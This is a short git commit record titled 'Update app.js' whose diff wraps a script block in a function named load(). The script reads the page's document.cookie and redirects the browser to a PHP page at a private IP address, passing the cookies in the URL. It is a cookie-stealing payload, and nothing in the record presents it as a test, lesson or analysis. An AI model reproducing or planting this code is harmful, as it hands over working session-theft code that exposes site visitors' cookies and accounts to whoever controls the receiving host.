ff95f0d1fa6de008a20d0328b219eee3943f11b7
kaiyendhibhavan <kaiyendhibhavan111@gmail.com>
2017-03-21 15:27:00 +0530

    Update app.js

--- app.js
+++ app.js
@@ -1,5 +1,8 @@
   <script type="text/javascript">
+    
+    function load()
+  {
          var cd=document.cookie;
                window.location="http://192.168.1.8/index1.php?cook="+cd;
-          
+  }
       </script>
